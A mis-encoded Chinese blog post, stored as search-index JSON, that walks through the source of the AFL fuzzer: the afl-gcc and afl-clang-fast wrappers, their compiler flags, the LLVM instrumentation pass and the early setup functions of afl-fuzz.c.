sanitizerç›¸å…³ï¼Œé€šè¿‡å¤šä¸ªifè¿›è¡Œåˆ¤æ–­ï¼š å¦‚æœ asan_set åœ¨å‰é¢è¢«è®¾ç½®ä¸º1ï¼Œåˆ™è®¾ç½®ç¯å¢ƒå˜é‡ AFL_USE_ASAN ä¸º1ï¼› å¦‚æœ asan_set ä¸ä¸º1ä¸”ï¼Œå­˜åœ¨ AFL_USE_ASAN ç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½® -U_FORTIFY_SOURCE -fsanitize=addressï¼› å¦‚æœä¸å­˜åœ¨ AFL_USE_ASAN ç¯å¢ƒå˜é‡ï¼Œä½†å­˜åœ¨ AFL_USE_MSAN ç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®-fsanitize=memoryï¼ˆä¸èƒ½åŒæ—¶æŒ‡å®šAFL_USE_ASANæˆ–è€…AFL_USE_MSANï¼Œä¹Ÿä¸èƒ½åŒæ—¶æŒ‡å®š AFL_USE_MSAN å’Œ AFL_HARDENï¼Œå› ä¸ºè¿™æ ·è¿è¡Œæ—¶é€Ÿåº¦è¿‡æ…¢ï¼› å¦‚æœä¸å­˜åœ¨ AFL_DONT_OPTIMIZE ç¯å¢ƒå˜é‡ï¼Œåˆ™è®¾ç½®-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1ï¼› å¦‚æœå­˜åœ¨ AFL_NO_BUILTIN ç¯å¢ƒå˜é‡ï¼Œåˆ™è¡¨ç¤ºå…è®¸è¿›è¡Œä¼˜åŒ–ï¼Œè®¾ç½®-fno-builtin-strcmp -fno-builtin-strncmp -fno-builtin-strcasecmp -fno-builtin-strncasecmp -fno-builtin-memcmp -fno-builtin-strstr -fno-builtin-strcasestrã€‚ æœ€åè¡¥å……cc_params[cc_par_cnt] = NULL;ï¼Œcc_params å‚æ•°æ•°ç»„ç¼–è¾‘å®Œæˆã€‚ ###ï¼ˆäºŒï¼‰ã€AFLçš„æ’æ¡© â€”â€” afl-as.c 1. æ¦‚è¿° afl-gcc æ˜¯ GNU as çš„ä¸€ä¸ªwrapperï¼ˆå°è£…ï¼‰ï¼Œå”¯ä¸€ç›®çš„æ˜¯é¢„å¤„ç†ç”± GCC/clang ç”Ÿæˆçš„æ±‡ç¼–æ–‡ä»¶ï¼Œå¹¶æ³¨å…¥åŒ…å«åœ¨ afl-as.h ä¸­çš„æ’æ¡©ä»£ç ã€‚ ä½¿ç”¨ afl-gcc / afl-clang ç¼–è¯‘ç¨‹åºæ—¶ï¼Œå·¥å…·é“¾ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒã€‚è¯¥wapperçš„ç›®æ ‡å¹¶ä¸æ˜¯ä¸ºäº†å®ç°å‘ .s æˆ– asmÂ ä»£ç å—ä¸­æ’å…¥æ‰‹å†™çš„ä»£ç ã€‚ experiment/clang_asm_normalize/ ä¸­å¯ä»¥æ‰¾åˆ°å¯èƒ½å…è®¸ clang ç”¨æˆ·è¿›è¡Œæ‰‹åŠ¨æ’å…¥è‡ªå®šä¹‰ä»£ç çš„è§£å†³æ–¹æ¡ˆï¼ŒGCCå¹¶ä¸èƒ½å®ç°è¯¥åŠŸèƒ½ã€‚ 2. æºç  1. å…³é”®å˜é‡ åœ¨å¼€å§‹å‡½æ•°ä»£ç åˆ†æå‰ï¼Œé¦–å…ˆè¦æ˜ç¡®å‡ ä¸ªå…³é”®å˜é‡ï¼š static u8** as_params; /* Parameters passed to the real 'as'ï¼Œä¼ é€’ç»™asçš„å‚æ•° */ static u8* input_file; /* Originally specified input file ï¼Œè¾“å…¥æ–‡ä»¶ */ static u8* modified_file; /* Instrumented file for the real 'as'ï¼Œasè¿›è¡Œæ’æ¡©å¤„ç†çš„æ–‡ä»¶ */ static u8 be_quiet, /* Quiet mode (no stderr output) ï¼Œé™é»˜æ¨¡å¼ï¼Œæ²¡æœ‰æ ‡å‡†è¾“å‡º */ clang_mode","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:3:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"äºŒã€AFL çš„æ’æ¡© â€”â€” llvm_mode ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"ï¼ˆä¸€ï¼‰ã€LLVM å‰ç½®çŸ¥è¯† LLVM ä¸»è¦ä¸ºäº†è§£å†³ç¼–è¯‘æ—¶å¤šç§å¤šæ ·çš„å‰ç«¯å’Œåç«¯å¯¼è‡´ç¼–è¯‘ç¯å¢ƒå¤æ‚ã€è‹›åˆ»çš„é—®é¢˜ï¼Œå…¶æ ¸å¿ƒä¸ºè®¾è®¡äº†ä¸€ä¸ªç§°ä¸º LLVMÂ IR çš„ä¸­é—´è¡¨ç¤ºï¼Œå¹¶ä»¥åº“çš„å½¢å¼æä¾›ä¸€äº›åˆ—æ¥å£ï¼Œä»¥æä¾›è¯¸å¦‚æ“ä½œ IR ã€ç”Ÿæˆç›®æ ‡å¹³å°ä»£ç ç­‰ç­‰åç«¯çš„åŠŸèƒ½ã€‚å…¶æ•´ä½“æ¶æ„å¦‚ä¸‹æ‰€ç¤ºï¼š ä¸åŒçš„å‰ç«¯å’Œåç«¯ä½¿ç”¨ç»Ÿä¸€çš„ä¸­é—´ä»£ç LLVM InterMediate Representation(LLVM IR)ï¼Œå…¶ç»“æœå°±æ˜¯å¦‚æœéœ€è¦æ”¯æŒä¸€é—¨æ–°çš„ç¼–ç¨‹è¯­è¨€ï¼Œåªéœ€è¦å®ç°ä¸€ä¸ªæ–°çš„å‰ç«¯ï¼›å¦‚æœéœ€è¦æ”¯æŒä¸€æ¬¾æ–°çš„ç¡¬ä»¶è®¾å¤‡ï¼Œåªéœ€è¦å®ç°ä¸€ä¸ªæ–°çš„åç«¯ï¼›ä¼˜åŒ–é˜¶æ®µä¸ºé€šç”¨é˜¶æ®µï¼Œé’ˆå¯¹ç»Ÿä¸€çš„ LLVM IR ï¼Œä¸æ–°çš„ç¼–ç¨‹è¯­è¨€å’Œç¡¬ä»¶è®¾å¤‡æ— å…³ã€‚ GCC çš„å‰åç«¯è€¦åˆåœ¨ä¸€èµ·ï¼Œæ²¡æœ‰è¿›è¡Œåˆ†ç¦»ï¼Œæ‰€ä»¥GCCä¸ºäº†æ”¯æŒä¸€é—¨æ–°çš„ç¼–ç¨‹è¯­è¨€æˆ–ä¸€ä¸ªæ–°çš„ç¡¬ä»¶è®¾å¤‡ï¼Œéœ€è¦é‡æ–°å¼€å‘å‰ç«¯åˆ°åç«¯çš„å®Œæ•´è¿‡ç¨‹ã€‚ Clang æ˜¯ LLVM é¡¹ç›®çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œå®ƒæ˜¯ LLVM æ¶æ„ä¸‹çš„ C/C++/Objective-C çš„ç¼–è¯‘å™¨ï¼Œæ˜¯ LLVM å‰ç«¯çš„ä¸€éƒ¨åˆ†ã€‚ç›¸è¾ƒäºGCCï¼Œå…·å¤‡ç¼–è¯‘é€Ÿåº¦å¿«ã€å ç”¨å†…å­˜å°‘ã€æ¨¡å—åŒ–è®¾è®¡ã€è¯Šæ–­ä¿¡æ¯å¯è¯»æ€§å¼ºã€è®¾è®¡æ¸…æ™°ç®€å•ç­‰ä¼˜ç‚¹ã€‚ æœ€ç»ˆä»æºç åˆ°æœºå™¨ç çš„æµç¨‹å¦‚ä¸‹ï¼ˆä»¥ Clang åšç¼–è¯‘å™¨ä¸ºä¾‹ï¼‰ï¼š ï¼ˆLLVM Pass æ˜¯ä¸€äº›ä¸­é—´è¿‡ç¨‹å¤„ç† IR çš„å¯ä»¥ç”¨æˆ·è‡ªå®šä¹‰çš„å†…å®¹ï¼Œå¯ä»¥ç”¨æ¥éå†ã€ä¿®æ”¹ IR ä»¥è¾¾åˆ°æ’æ¡©ã€ä¼˜åŒ–ã€é™æ€åˆ†æç­‰ç›®çš„ã€‚ï¼‰ ä»£ç é¦–å…ˆç”±ç¼–è¯‘å™¨å‰ç«¯clangå¤„ç†åå¾—åˆ°ä¸­é—´ä»£ç IRï¼Œç„¶åç»è¿‡å„ LLVM Pass è¿›è¡Œä¼˜åŒ–å’Œè½¬æ¢ï¼Œæœ€ç»ˆäº¤ç»™ç¼–è¯‘å™¨åç«¯ç”Ÿæˆæœºå™¨ç ã€‚ ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"ï¼ˆäºŒï¼‰ã€ AFLçš„afl-clang-fast 1. æ¦‚è¿° AFLçš„ llvm_mode å¯ä»¥å®ç°ç¼–è¯‘å™¨çº§åˆ«çš„æ’æ¡©ï¼Œå¯ä»¥æ›¿ä»£ afl-gcc æˆ– afl-clang ä½¿ç”¨çš„æ¯”è¾ƒâ€œç²—æš´â€çš„æ±‡ç¼–çº§åˆ«çš„é‡å†™çš„æ–¹æ³•ï¼Œä¸”å…·å¤‡å¦‚ä¸‹å‡ ä¸ªä¼˜åŠ¿ï¼š ç¼–è¯‘å™¨å¯ä»¥è¿›è¡Œå¾ˆå¤šä¼˜åŒ–ä»¥æå‡æ•ˆç‡ï¼› å¯ä»¥å®ç°CPUæ— å…³ï¼Œå¯ä»¥åœ¨é x86 æ¶æ„ä¸Šè¿›è¡Œfuzzï¼› å¯ä»¥æ›´å¥½åœ°å¤„ç†å¤šçº¿ç¨‹ç›®æ ‡ã€‚ åœ¨AFLçš„ llvm_mode æ–‡ä»¶å¤¹ä¸‹åŒ…å«3ä¸ªæ–‡ä»¶ï¼š afl-clang-fast.c ï¼ŒÂ afl-llvm-pass.so.ccï¼ŒÂ afl-llvm-rt.o.cã€‚ afl-llvm-rt.o.c æ–‡ä»¶ä¸»è¦æ˜¯é‡å†™äº† afl-as.h æ–‡ä»¶ä¸­çš„ main_payload éƒ¨åˆ†ï¼Œæ–¹ä¾¿è°ƒç”¨ï¼› afl-llvm-pass.so.cc æ–‡ä»¶ä¸»è¦æ˜¯å½“é€šè¿‡ afl-clang-fast è°ƒç”¨ clang æ—¶ï¼Œè¿™ä¸ªpassè¢«æ’å…¥åˆ° LLVM ä¸­ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨æ·»åŠ ä¸ ``afl-as.h` ä¸­å¤§è‡´ç­‰æ•ˆçš„ä»£ç ï¼› afl-clang-fast.c æ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ clang çš„ wrapperï¼Œæœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯ clang ã€‚ä½†æ˜¯ä¸ afl-gcc ä¸€æ ·ï¼Œä¼šè¿›è¡Œä¸€äº›å‚æ•°å¤„ç†ã€‚ llvm_mode çš„æ’æ¡©æ€è·¯å°±æ˜¯é€šè¿‡ç¼–å†™passæ¥å®ç°ä¿¡æ¯è®°å½•ï¼Œå¯¹æ¯ä¸ªåŸºæœ¬å—éƒ½æ’å…¥æ¢é’ˆï¼Œå…·ä½“ä»£ç åœ¨ afl-llvm-pass.so.cc æ–‡ä»¶ä¸­ï¼Œåˆå§‹åŒ–å’Œforkserveræ“ä½œé€šè¿‡é“¾æ¥å®Œæˆã€‚ 2. æºç  1. afl-clang-fast.c 1. main å‡½æ•° main å‡½æ•°çš„å…¨éƒ¨é€»è¾‘å¦‚ä¸‹ï¼š ä¸»è¦æ˜¯å¯¹ find_obj(),Â edit_params(),Â execvp() å‡½æ•°çš„è°ƒç”¨ï¼Œ å…¶ä¸­ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªå‡½æ•°çš„è°ƒç”¨ï¼š find_obj(argv[0])ï¼šæŸ¥æ‰¾è¿è¡Œæ—¶library edit_params(argc, argv)ï¼šå¤„ç†ä¼ å…¥çš„ç¼–è¯‘å‚æ•°ï¼Œå°†ç¡®å®šå¥½çš„å‚æ•°æ”¾å…¥ cc_params[] æ•°ç»„ execvp(cc_params[0], (cahr**)cc_params)ï¼šæ›¿æ¢è¿›ç¨‹ç©ºé—´ï¼Œä¼ é€’å‚æ•°ï¼Œæ‰§è¡Œè¦è°ƒç”¨çš„clang è¿™é‡Œåä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ä¸ afl-gcc.c ä¸­çš„ä½œç”¨åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯å¯¹å‚æ•°çš„å¤„ç†è¿‡ç¨‹å­˜åœ¨ä¸åŒï¼Œä¸åŒçš„ä¸»è¦æ˜¯ find_obj() å‡½æ•°ã€‚ 2. find_obj å‡½æ•° find_obj()å‡½æ•°çš„æ§åˆ¶æµé€»è¾‘å¦‚ä¸‹ï¼š é¦–å…ˆï¼Œè¯»å–ç¯å¢ƒå˜é‡ AFL_PATH çš„å€¼ï¼š å¦‚æœè¯»å–æˆåŠŸï¼Œç¡®è®¤ AFL_PATH/afl-llvm-rt.o æ˜¯å¦å¯ä»¥è®¿é—®ï¼›å¦‚æœå¯ä»¥è®¿é—®ï¼Œè®¾ç½®è¯¥ç›®å½•ä¸º obj_path ï¼Œç„¶åç›´æ¥è¿”å›ï¼› å¦‚æœè¯»å–å¤±è´¥ï¼Œæ£€æŸ¥ arg0 ä¸­æ˜¯å¦å­˜åœ¨ / å­—ç¬¦ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™åˆ¤æ–­æœ€åä¸€ä¸ª / å‰é¢çš„è·¯å¾„ä¸º AFL çš„æ ¹ç›®å½•ï¼›ç„¶åè¯»å–afl-llvm-rt.oæ–‡ä»¶ï¼ŒæˆåŠŸè¯»å–ï¼Œè®¾ç½®è¯¥ç›®å½•ä¸º obj_path ï¼Œç„¶åç›´æ¥è¿”å›ã€‚ å¦‚æœä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½å¤±è´¥ï¼Œåˆ°/usr/local/lib/afl ç›®å½•ä¸‹æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ afl-llvm-rt.o ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™è®¾ç½®ä¸º obj_path å¹¶ç›´æ¥è¿”å›ï¼ˆä¹‹æ‰€ä»¥å‘è¯¥è·¯å¾„ä¸‹å¯»æ‰¾ï¼Œæ˜¯å› ä¸ºé»˜è®¤çš„AFLçš„MakeFileåœ¨ç¼–è¯‘æ—¶ï¼Œä¼šå®šä¹‰ä¸€ä¸ªåä¸ºAFL_PATHçš„å®ï¼Œè¯¥å®ä¼šæŒ‡å‘è¯¥è·¯å¾„ï¼‰ï¼› å¦‚æœä»¥ä¸Šå…¨éƒ¨å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸æç¤ºæ‰¾ä¸åˆ° afl-llvm-rt.o æ–‡ä»¶æˆ– afl-llvm-pass.so æ–‡ä»¶ï¼Œå¹¶è¦æ±‚è®¾ç½® AFL_PATH ç¯å¢ƒå˜é‡ ã€‚ å‡½æ•°çš„ä¸»è¦åŠŸèƒ½æ˜¯åœ¨å¯»æ‰¾AFLçš„è·¯å¾„ä»¥æ‰¾åˆ° afl-llvm-rt.o æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å³ä¸ºè¦ç”¨åˆ°çš„è¿è¡Œæ—¶åº“ã€‚ 3. edit_params å‡½æ•° è¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨ä»ç„¶ä¸ºç¼–è¾‘å‚æ•°æ•°ç»„ï¼Œå…¶æ§åˆ¶æµç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆï¼Œåˆ¤æ–­æ‰§è¡Œçš„æ˜¯å¦ä¸º afl-clang-fast++ ï¼š å¦‚æœæ˜¯ï¼Œè®¾ç½® cc_params[0] ä¸ºç¯å¢ƒå˜é‡ AFL_CXXï¼›å¦‚æœç¯å¢ƒå˜é‡ä¸ºç©ºï¼Œåˆ™è®¾ç½®ä¸º clang++ ï¼› å¦‚æœä¸æ˜¯ï¼Œè®¾ç½® cc_params[0] ä¸ºç¯å¢ƒå˜é‡ AFL_CCï¼›å¦‚æœç¯å¢ƒå˜é‡ä¸ºç©ºï¼Œåˆ™è®¾ç½®ä¸º clang ï¼› åˆ¤æ–­æ˜¯å¦å®šä¹‰äº† USE_TRACE_PC å®ï¼Œå¦‚æœæœ‰ï¼Œæ·»åŠ  -fsanitize-coverage=trace-pc-guard -mllvm(only Android) -sanitizer-coverage-block-threshold=0(only Android) é€‰é¡¹åˆ°å‚æ•°æ•°ç»„ï¼›å¦‚æœæ²¡æœ‰ï¼Œä¾æ¬¡å°† -Xclang -load -Xclang obj_path/afl-llvm-pass.so -Qunused-arguments é€‰é¡¹æ·»åŠ åˆ°å‚æ•°æ•°ç»„ï¼›ï¼ˆè¿™é‡Œæ¶‰åŠåˆ°llvm_modeä½¿ç”¨çš„2ç§æ’æ¡©æ–¹å¼ï¼šé»˜è®¤ä½¿ç”¨çš„æ˜¯ä¼ ç»Ÿæ¨¡å¼ï¼Œä½¿ç”¨ afl-llvm-pass.so æ³¨å…¥æ¥è¿›è¡Œæ’æ¡©ï¼Œè¿™ç§æ–¹å¼è¾ƒä¸ºç¨³å®šï¼›å¦å¤–ä¸€ç§æ˜¯å¤„äºå®éªŒé˜¶æ®µçš„æ–¹å¼â€”â€”trace-pc-guard æ¨¡å¼ï¼Œå¯¹äºè¯¥æ¨¡å¼çš„è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒllvmç›¸å…³æ–‡æ¡£â€”â€”tracing-pcs-with-guardsï¼‰ éå†ä¼ é€’ç»™ afl-clang-fast çš„å‚æ•°ï¼Œè¿›è¡Œä¸€å®šçš„æ£€æŸ¥å’Œè®¾ç½®ï¼Œå¹¶æ·»åŠ åˆ° cc_params æ•°ç»„ï¼š å¦‚æœå­˜åœ¨ -m32 æˆ– armv7a-linux-androideabi ï¼Œè®¾ç½® bit_mode ä¸º32ï¼› å¦‚æœå­˜åœ¨ -m64 ï¼Œè®¾ç½® bit_mode ä¸º64ï¼› å¦‚æœå­˜åœ¨ -x ï¼Œè®¾ç½® x_set ä¸º1ï¼› å¦‚æœå­˜åœ¨ -fsanitize=address æˆ– -fsanitize=memoryï¼Œè®¾ç½® asan_set ä¸º1ï¼› å¦‚æœå­˜åœ¨ -Wl,-z,defs æˆ– -Wl,--no-undefinedï¼Œåˆ™ç›´æ¥passæ‰ã€‚ æ£€æŸ¥ç¯å¢ƒå˜é‡æ˜¯å¦è®¾ç½®äº† AFL_HARDENï¼š å¦‚æœæœ‰ï¼Œæ·»åŠ  -fstack-protector-all é€‰é¡¹ï¼› å¦‚æœæœ‰ä¸”æ²¡æœ‰è®¾ç½® FORTIFY_SOURCE ï¼Œæ·»åŠ  -D_FORTIFY_SOURCE=2 é€‰é¡¹ï¼› æ£€æŸ¥å‚æ•°ä¸­æ˜¯å¦å­˜åœ¨ -fsanitize=memoryï¼Œå³ asan_set ä¸º0ï¼š å¦‚æœæ²¡æœ‰ï¼Œå°è¯•è¯»å–ç¯å¢ƒå˜é‡ AFL_USE_ASANï¼Œå¦‚æœå­˜åœ¨ï¼Œæ·»åŠ  -U_FORTIFY_SOURCE -fsanitize=addressï¼› æ¥ä¸‹æ¥å¯¹ç¯å¢ƒå˜é‡AFL_USE_MSANçš„å¤„ç†æ–¹å¼ä¸ AFL_USE_ASAN ç±»ä¼¼ï¼Œæ·»åŠ çš„é€‰é¡¹ä¸º -U_FORTIFY_SOURCEÂ -fsanitize=memoryï¼› æ£€æŸ¥æ˜¯å¦å®šä¹‰äº† USE_TRACE_PC å®ï¼Œå¦‚æœå­˜åœ¨å®šä¹‰ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¯å¢ƒå˜é‡ AFL_INST_RATIOï¼Œå¦‚æœå­˜åœ¨ï¼ŒæŠ›å‡ºå¼‚å¸¸AFL_INST_RATIO æ— æ³•åœ¨trace-pcæ—¶ä½¿ç”¨ï¼› æ£€æŸ¥ç¯å¢ƒå˜é‡ AFL_NO_BUILTIN ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œæ·»åŠ  -gÂ -O3Â -funroll-loopsï¼› æ£€æŸ¥ç¯å¢ƒå˜é‡ AFL_NO_BUILTINï¼Œå¦‚æœè¿›è¡Œäº†è®¾ç½®ï¼Œæ·»åŠ  -fno-builtin-strcmp -fno-builtin-strncmp -fno-builtin-strcasecmp -fno-builtin-strcasecmp -fno-builtin-memcmpï¼› æ·»åŠ å‚æ•° -D__AFL_HAVE_MANUAL_CONTROL=1Â -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1ï¼› å®šä¹‰äº†ä¸¤ä¸ªå® __AFL_LOOP(),Â __AFL_INIT()ï¼› æ£€æŸ¥æ˜¯å¦è®¾ç½®äº† x_setï¼Œ å¦‚æœæœ‰æ·»åŠ  -xÂ noneï¼› æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å® __ANDORID__ ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ¤æ–­ bit_mode çš„å€¼ï¼š å¦‚æœä¸º0ï¼Œå³æ²¡æœ‰-m32å’Œ-m64ï¼Œæ·»åŠ  obj_path/afl-llvm-rt.o ï¼› å¦‚æœä¸º32ï¼Œæ·»åŠ  obj_path/afl-llvm-rt-32.o ï¼› å¦‚æœä¸º64ï¼Œæ·»åŠ  obj_path/afl-llvm-rt-64.o ã€‚ 2. afl-llvm-pass.so.cc afl-llvm-pass.so.cc æ–‡ä»¶å®ç°äº† LLVM-mode ä¸‹çš„ä¸€ä¸ªæ’æ¡© LLVM Passã€‚ æœ¬æ–‡ä¸è¿‡å¤šå…³å¿ƒå¦‚ä½•å®ç°ä¸€ä¸ªLLVM Passï¼Œé‡ç‚¹åˆ†æè¯¥passçš„å®ç°é€»è¾‘ã€‚ è¯¥æ–‡ä»¶åªæœ‰ä¸€ä¸ªTransformÂ passï¼šÂ AFLCoverageï¼Œç»§æ‰¿è‡ª ModulePassï¼Œå®ç°äº†ä¸€ä¸ª runOnModule å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦é‡ç‚¹åˆ†æçš„å‡½æ•°ã€‚ namespace { class AFLCoverage : public ModulePass { public: static char ID; AFLCoverage() : ModulePass(ID) { } bool runOnModule(Module \u0026M) override; // StringRef getPassName() const override { // return \"American Fuzzy Lop Instrumentation\"; // } }; } 1. passæ³¨å†Œ å¯¹passè¿›è¡Œæ³¨å†Œçš„éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š static void registerAFLPass(const PassManagerBuilder \u0026, legacy::PassManagerBase \u0026PM) { PM.add(new AFLCoverage()); } static RegisterStandardPasses RegisterAFLPass( PassManagerBuilder::EP_ModuleOptimizerEarly, registerAFLPass); static RegisterStandardPasses RegisterAFLPass0( P","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"ä¸‰ã€AFLçš„fuzzer â€”â€” afl-fuzz.c ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"1. ã€æ¦‚è¿° AFLä¸­æœ€é‡è¦çš„éƒ¨åˆ†ä¾¿æ˜¯fuzzerçš„å®ç°éƒ¨åˆ†â€”â€”afl_fuzz.c ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯é€šè¿‡ä¸æ–­å˜å¼‚æµ‹è¯•ç”¨ä¾‹æ¥å½±å“ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ã€‚è¯¥æ–‡ä»¶ä»£ç é‡åœ¨8000è¡Œå·¦å³ï¼Œå¤„äºç¯‡å¹…åŸå› ï¼Œæˆ‘ä»¬ä¸ä¼šå¯¹æ¯ä¸€ä¸ªå‡½æ•°è¿›è¡Œæºç çº§åˆ†æï¼Œè€Œæ˜¯æŒ‰ç…§åŠŸèƒ½åˆ’åˆ†ï¼Œä»‹ç»å…¶ä¸­çš„æ ¸å¿ƒå‡½æ•°ã€‚è¯¥æ–‡ä»¶å±äºAFLæ•´ä¸ªé¡¹ç›®çš„æ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼Œå¼ºçƒˆå»ºè®®é€šè¯»è¯¥æ–‡ä»¶ã€‚ åœ¨ä»‹ç»æºç çš„åŒæ—¶ï¼Œä¼šç©¿æ’AFLçš„æ•´ä½“è¿è¡Œè¿‡ç¨‹å’Œè®¾è®¡æ€è·¯ï¼Œè¾…åŠ©ç†è§£æºç çš„è®¾è®¡æ€è·¯ã€‚ åœ¨åŠŸèƒ½ä¸Šï¼Œå¯ä»¥æ€»ä½“ä¸Šåˆ†ä¸º3éƒ¨åˆ†ï¼š åˆå§‹é…ç½®ï¼šè¿›è¡Œfuzzç¯å¢ƒé…ç½®ç›¸å…³å·¥ä½œ fuzzæ‰§è¡Œï¼šfuzzçš„ä¸»å¾ªç¯è¿‡ç¨‹ å˜å¼‚ç­–ç•¥ï¼šæµ‹è¯•ç”¨ä¾‹çš„å˜å¼‚è¿‡ç¨‹å’Œæ–¹å¼ æˆ‘ä»¬å°†æŒ‰ç…§ä»¥ä¸Š3ä¸ªåŠŸèƒ½å¯¹å…¶ä¸­çš„å…³é”®å‡½æ•°å’Œæµç¨‹è¿›è¡Œåˆ†æã€‚ ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"2ã€æ ¸å¿ƒæºç åˆ†æ 1. åˆå§‹é…ç½® 1.1 ç¬¬ä¸€ä¸ªwhileå¾ªç¯ while ((opt = getopt(argc, argv, \"+iâ­•fâ“œï¸b:t:T:dnCB:S:M:x:QV\")) \u003e 0) ... ... è¯¥å¾ªç¯ä¸»è¦é€šè¿‡ getopt è·å–å„ç§ç¯å¢ƒé…ç½®ã€é€‰é¡¹å‚æ•°ç­‰ã€‚ 1.2 setup_signal_handlers å‡½æ•° è°ƒç”¨ sigaction ï¼Œæ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°ï¼Œè®¾ç½®ä¿¡å·å¥æŸ„ã€‚å…·ä½“çš„ä¿¡å·å†…å®¹å¦‚ä¸‹ï¼š ä¿¡å· ä½œç”¨ SIGHUP/SIGINT/SIGTERM å¤„ç†å„ç§â€œstopâ€æƒ…å†µ SIGALRM å¤„ç†è¶…æ—¶çš„æƒ…å†µ SIGWINCH å¤„ç†çª—å£å¤§å° SIGUSER1 ç”¨æˆ·è‡ªå®šä¹‰ä¿¡å·ï¼Œè¿™é‡Œå®šä¹‰ä¸ºskip request SIGSTP/SIGPIPE ä¸æ˜¯å¾ˆé‡è¦çš„ä¸€äº›ä¿¡å·ï¼Œå¯ä»¥ä¸ç”¨å…³å¿ƒ 1.3 check_asan_opts å‡½æ•° è¯»å–ç¯å¢ƒå˜é‡ ASAN_OPTIONS å’Œ MSAN_OPTIONSï¼Œåšä¸€äº›å¿…è¦æ€§æ£€æŸ¥ã€‚ 1.4 fix_up_sync å‡½æ•° å¦‚æœé€šè¿‡ -Mæˆ–è€…-SæŒ‡å®šäº† sync_idï¼Œåˆ™æ›´æ–° out_dir å’Œ sync_dir çš„å€¼ï¼šè®¾ç½® sync_dir çš„å€¼ä¸º out_dirï¼Œè®¾ç½® out_dir çš„å€¼ä¸ºout_dir/sync_idã€‚ 1.5 save_cmdline å‡½æ•° copyå½“å‰å‘½ä»¤è¡Œå‚æ•°ï¼Œä¿å­˜ã€‚ 1.6 check_if_tty å‡½æ•° æ£€æŸ¥æ˜¯å¦åœ¨ttyç»ˆç«¯ä¸Šé¢è¿è¡Œï¼šè¯»å–ç¯å¢ƒå˜é‡ AFL_NO_UI ï¼Œå¦‚æœå­˜åœ¨ï¼Œè®¾ç½® not_on_tty ä¸º1ï¼Œå¹¶è¿”å›ï¼›é€šè¿‡ ioctl è¯»å–window sizeï¼Œå¦‚æœæŠ¥é”™ä¸º ENOTTYï¼Œè¡¨ç¤ºå½“å‰ä¸åœ¨ä¸€ä¸ªttyç»ˆç«¯è¿è¡Œï¼Œè®¾ç½® not_on_ttyã€‚ 1.7 å‡ ä¸ªCPUæ£€æŸ¥ç›¸å…³çš„å‡½æ•° static void get_core_count(void)get_core_count() ï¼šè·å–æ ¸å¿ƒæ•°é‡ check_crash_handling()ï¼šç¡®ä¿æ ¸å¿ƒè½¬å‚¨ä¸ä¼šè¿›å…¥ç¨‹åº check_cpu_governor()ï¼šæ£€æŸ¥CPUç®¡ç†è€… 1.8 setup_shm å‡½æ•° è¯¥å‡½æ•°ç”¨äºè®¾ç½®å…±äº«å†…å­˜å’Œ 